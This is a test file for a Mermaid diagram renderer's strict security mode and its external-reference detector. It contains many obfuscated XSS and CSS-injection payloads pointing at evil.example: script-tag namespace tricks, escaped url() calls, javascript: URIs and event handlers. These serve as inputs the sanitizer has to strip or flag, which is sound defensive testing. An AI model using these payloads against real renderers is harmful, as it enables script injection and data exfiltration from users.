// Loop 11 M3 (#7645/#7695): strict security mode — no external fetch in
// agent-generated diagram output.

import { describe, test, expect } from 'bun:test'
import { renderMermaidSVG, verifyNoExternalRefs } from '../index.ts'

describe('#7645/#7695 strict security mode', () => {
  test('strict mode SVG has zero external-fetch references', () => {
    const svg = renderMermaidSVG('flowchart TD\n A[Start] --> B[End]', { security: 'strict' })
    expect(verifyNoExternalRefs(svg)).toEqual({ ok: true, refs: [] })
  })

  test('default mode still emits the Google Fonts @import (back-compat)', () => {
    const svg = renderMermaidSVG('flowchart TD\n A --> B')
    const v = verifyNoExternalRefs(svg)
    expect(v.ok).toBe(false)
    expect(v.refs.some(r => r.includes('fonts.googleapis.com'))).toBe(true)
  })

  test('strict mode preserves the --font CSS variable (family still declared)', () => {
    const svg = renderMermaidSVG('flowchart TD\n A --> B', { security: 'strict' })
    expect(svg).toContain('--font')
  })

  test('strict mode strips external refs from user theme/config values', () => {
    const flow = renderMermaidSVG('flowchart TD\n A --> B', {
      security: 'strict',
      mermaidConfig: { themeVariables: { primaryColor: 'url(https://evil.example/fill.svg)', secondaryColor: 'url(javascript:alert(1))' } } as any,
    })
    expect(flow).not.toContain('https://evil.example')
    expect(flow).not.toMatch(/javascript\s*:/i)
    expect(verifyNoExternalRefs(flow)).toEqual({ ok: true, refs: [] })

    const chart = renderMermaidSVG(`---
config:
  themeCSS: |
    @import url(https://evil.example/x.css);
    @import "HTTPS://evil.example/no-semi.css"
    @import/**/"//evil.example/comment.css"
    .xychart-title { fill: url(" //evil.example/fill.svg"); }
    .xychart-bar { fill: url(/**///evil.example/comment-fill.svg); stroke: \\75\\72\\6c(//evil.example/escaped.svg); }
    .xychart-label { fill: ur\\l(https://evil.example/simple-escape.svg); }
---
xychart
  title Revenue
  bar [10, 20]`, { security: 'strict' })
    expect(chart).not.toContain('https://evil.example')
    expect(chart).not.toContain('//evil.example')
    expect(verifyNoExternalRefs(chart)).toEqual({ ok: true, refs: [] })
  })

  test('strict mode strips active-content tags injected through raw themeCSS', () => {
    const svg = renderMermaidSVG(`---
config:
  themeCSS: |
    </style><script src="//evil.example/x.js"/><svg:script xmlns:svg="http://www.w3.org/2000/svg">alert(1)</svg:script><_:script xmlns:_="http://www.w3.org/2000/svg">alert(1)</_:script><é:script xmlns:é="http://www.w3.org/2000/svg">alert(1)</é:script><foreignObject/><object data="//evil.example/x"></object><embed src="//evil.example/e"/><iframe src="//evil.example/i"></iframe><use xl:href="//evil.example/s.svg#x" xmlns:xl="http://www.w3.org/1999/xlink"/><use href="https:&amp;#x2f;&amp;#x2f;evil.example/entity.svg#x"/><rect onload="alert(1)"/><a href=//evil.example/x>bad</a><a href=" //evil.example/spaced">bad</a><a onclick='alert(2)' href="javascript:alert(3)">x</a>
---
xychart
  bar [10, 20]`, { security: 'strict' })
    expect(svg).not.toMatch(/<(?:[^\s<>/:]+:)?script\b/i)
    expect(svg).not.toMatch(/<foreignObject\b/i)
    expect(svg).not.toMatch(/<object\b|<embed\b|<iframe\b/i)
    expect(svg).not.toMatch(/\son[a-z][\w:.-]*\s*=/i)
    expect(svg).not.toMatch(/javascript\s*:/i)
    expect(svg).not.toContain('//evil.example')
    expect(verifyNoExternalRefs(svg)).toEqual({ ok: true, refs: [] })
  })

  test('strict mode works across families', () => {
    for (const src of [
      'sequenceDiagram\n A->>B: hi',
      'classDiagram\n A <|-- B',
      'erDiagram\n A ||--o{ B : x',
      'stateDiagram-v2\n [*] --> S',
    ]) {
      const svg = renderMermaidSVG(src, { security: 'strict' })
      expect(verifyNoExternalRefs(svg).ok).toBe(true)
    }
  })

  test('xmlns namespace declaration is NOT flagged as an external ref', () => {
    // The SVG always carries xmlns="http://www.w3.org/2000/svg" — a declaration,
    // not a fetch. verifyNoExternalRefs must not flag it.
    const svg = renderMermaidSVG('flowchart TD\n A --> B', { security: 'strict' })
    expect(svg).toContain('xmlns="http://www.w3.org/2000/svg"')
    expect(verifyNoExternalRefs(svg).ok).toBe(true)
  })

  test('verifyNoExternalRefs flags an @import', () => {
    const v = verifyNoExternalRefs('<svg><style>@import url(https://evil.example/x.css);</style></svg>')
    expect(v.ok).toBe(false)
    expect(v.refs.length).toBeGreaterThan(0)
  })

  test('verifyNoExternalRefs flags <image>, active tags, http href', () => {
    expect(verifyNoExternalRefs('<svg><image href="https://x/y.png"/></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><script>fetch("//x")</script></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><svg:script xmlns:svg="http://www.w3.org/2000/svg">x</svg:script></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><_:script xmlns:_="http://www.w3.org/2000/svg">x</_:script></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><é:script xmlns:é="http://www.w3.org/2000/svg">x</é:script></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><object data="//x"></object></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><embed src="//x"/></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><iframe src="//x"></iframe></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><a href="https://x">t</a></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><a href=//x>t</a></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><a href=" //x">t</a></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><rect fill="url(//x/y.svg)"/></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><rect fill="url( //x/y.svg)"/></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><rect fill="url(javascript:alert(1))"/></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><style>@import url(javascript:alert(1));</style></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><style>@import "HTTPS://evil.example/x.css"</style></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><style>@import/**/"//evil.example/x.css"</style></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><rect fill="url(/**///evil.example/x.svg)"/></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><rect fill="\\75\\72\\6c(//evil.example/x.svg)"/></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><rect fill="ur\\l(https://evil.example/x.svg)"/></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><use xl:href="//evil.example/s.svg#x" xmlns:xl="http://www.w3.org/1999/xlink"/></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><use href="https:&#x2f;&#x2f;evil.example/s.svg#x"/></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><use href="https:&amp;#x2f;&amp;#x2f;evil.example/s.svg#x"/></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><rect onload="alert(1)"/></svg>').ok).toBe(false)
    expect(verifyNoExternalRefs('<svg><a href="javascript:alert(1)">x</a></svg>').ok).toBe(false)
  })

  test('a clean inline SVG passes', () => {
    expect(verifyNoExternalRefs('<svg xmlns="http://www.w3.org/2000/svg"><rect/></svg>')).toEqual({ ok: true, refs: [] })
  })
})
